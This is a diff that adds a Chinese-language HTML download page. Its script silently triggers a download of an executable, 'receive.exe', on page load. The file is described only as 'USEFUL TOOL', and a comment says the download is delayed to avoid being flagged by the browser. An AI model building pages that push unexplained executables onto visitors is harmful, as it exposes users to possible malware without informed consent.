@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="page-name" content="DOWNLOAD">
+    <meta name="base-title" content="自动下载">
+    <link rel="stylesheet" href="/common.css">
+    <link rel="stylesheet" href="/style.css">
+    <title>正在下载…</title>
+    <style>
+        /* 针对本页面的额外点缀 */
+        .download-card {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 2.5rem 2rem;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+        }
+
+        .download-icon-large {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+        }
+
+        .download-message {
+            font-size: 1.3rem;
+            font-weight: 500;
+            margin-bottom: 0.75rem;
+            color: var(--text-color);
+        }
+
+        .download-hint {
+            color: var(--footer-text);
+            margin-bottom: 2rem;
+            opacity: 0.8;
+        }
+
+        .manual-download-btn {
+            display: inline-block;
+            background: var(--gradient-purple);
+            color: white;
+            padding: 14px 32px;
+            border-radius: 60px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: transform 0.2s ease, box-shadow 0.2s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(138, 43, 226, 0.2);
+        }
+
+        .manual-download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(138, 43, 226, 0.3);
+        }
+
+        .file-info {
+            margin-top: 1.5rem;
+            font-size: 0.9rem;
+            color: var(--footer-text);
+            border-top: 1px dashed var(--border-color);
+            padding-top: 1.5rem;
+        }
+    </style>
+</head>
+<body>
+    <div id="header-placeholder"></div>
+
+    <main>
+        <section class="fullscreen" style="justify-content: center; min-height: calc(100vh - 64px - 7vh);">
+            <div class="download-card">
+                <div class="download-icon-large">📦</div>
+                <div class="download-message" id="status-message">正在准备下载…</div>
+                <div class="download-hint" id="hint-message">如果下载没有自动开始，请点击下方按钮</div>
+                
+                <a href="#" id="download-link" class="manual-download-btn">
+                    点击手动下载
+                </a>
+
+                <div class="file-info">
+                    <span id="file-details">正在加载文件信息…</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div id="footer-placeholder"></div>
+
+    <script src="/components.js"></script>
+    <script src="/script.js"></script>
+    <script>
+        (function() {
+            // ----- 配置区域：在这里修改你要下载的文件 -----
+            const downloadConfig = {
+                // 文件下载链接（支持相对路径或绝对URL）
+                url: 'downloads/receive.exe',
+                // 文件名（可选，用于显示）
+                fileName: 'receive.exe',
+                // 文件大小/描述（可选）
+                description: 'USEFUL TOOL'
+            };
+            // -----------------------------------------
+
+            // 更新页面显示
+            const fileDetailsEl = document.getElementById('file-details');
+            const downloadLinkEl = document.getElementById('download-link');
+            const statusMsgEl = document.getElementById('status-message');
+
+            if (fileDetailsEl) {
+                fileDetailsEl.textContent = `${downloadConfig.fileName}  ·  ${downloadConfig.description}`;
+            }
+            if (downloadLinkEl) {
+                downloadLinkEl.href = downloadConfig.url;
+                downloadLinkEl.setAttribute('download', downloadConfig.fileName); // 提示浏览器下载
+            }
+
+            // 自动触发下载函数
+            function triggerAutoDownload() {
+                const link = document.createElement('a');
+                link.href = downloadConfig.url;
+                link.download = downloadConfig.fileName;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                if (statusMsgEl) {
+                    statusMsgEl.textContent = '下载已开始 或 已弹出保存对话框';
+                }
+                const hintEl = document.getElementById('hint-message');
+                if (hintEl) {
+                    hintEl.textContent = '如果没有弹出下载，请点击上方按钮手动下载';
+                }
+            }
+
+            // 尝试自动下载（在DOM加载完成后稍作延迟，避免被浏览器误判）
+            window.addEventListener('load', function() {
+                setTimeout(function() {
+                    triggerAutoDownload();
+                }, 300); // 延迟300ms，让页面渲染完成
+            });
+
+            // 如果load事件已经错过（比如脚本在load之后执行），直接尝试
+            if (document.readyState === 'complete') {
+                setTimeout(triggerAutoDownload, 100);
+            }
+
+            // 用户手动点击下载按钮时的处理（可选）
+            if (downloadLinkEl) {
+                downloadLinkEl.addEventListener('click', function(e) {
+                    // 对于手动点击，浏览器会正常处理 download 属性，不需要额外操作
+                    // 但可以改变一下提示
+                    if (statusMsgEl) {
+                        statusMsgEl.textContent = '正在准备下载…';
+                    }
+                });
+            }
+        })();
+    </script>
+</body>
+</html>
